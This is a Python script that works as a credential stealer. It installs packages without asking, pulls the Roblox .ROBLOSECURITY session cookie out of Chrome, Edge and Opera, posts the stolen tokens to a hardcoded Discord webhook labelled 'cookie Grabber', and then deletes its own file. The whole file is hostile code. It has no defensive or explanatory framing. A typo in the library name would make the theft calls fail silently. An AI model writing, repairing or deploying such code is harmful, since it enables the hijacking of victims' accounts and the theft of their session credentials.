import subprocess
import sys
try:
  subprocess.check_call([sys.executable, "-m", "pip", "install", 'browser_cookie3'])
  subprocess.check_call([sys.executable, "-m", "pip", "install", 'discord_webhook'])
  subprocess.check_call([sys.executable, "-m", "pip", "install", 'requests'])
except:
  pass
import browser_cookie3, requests, threading
import base64
import time
import os
from discord_webhook import DiscordWebhook, DiscordEmbed
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
from re import findall
key = "https://discord.com/api/webhooks/1053332803422535731/qcCIya2-TJBHI4KzPIVYG9aF2ct44qUjgi-zDmsRI9d7h72ZXfkiI5X3leTeIXxKkhh2"
weblook = key
webhookl = DiscordWebhook(url=weblook, username="cookie Grabber")
def chrome_logger():
    try:
        cookies = browwser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        return str(cookie)

    except:
        pass
def edge_logger():
    try:
        cookies = browwser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        return str(cookie)

    except:
        pass
def opera_logger():
    try:
        cookies = browwser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        return str(cookie)

    except:
        pass
broww = []
p1 = chrome_logger()
p2 = edge_logger()
p3 = opera_logger()
broww.append(p1)
broww.append(p2)
broww.append(p3)
temp = []
for x in broww:
    if x not in temp:
        temp.append(x)

print(temp)

for i in temp:
    embed = DiscordEmbed(title=".ROBLOSECURITY", description=i)
    webhookl.add_embed(embed)
response = webhookl.execute()

os.remove('./dub.py')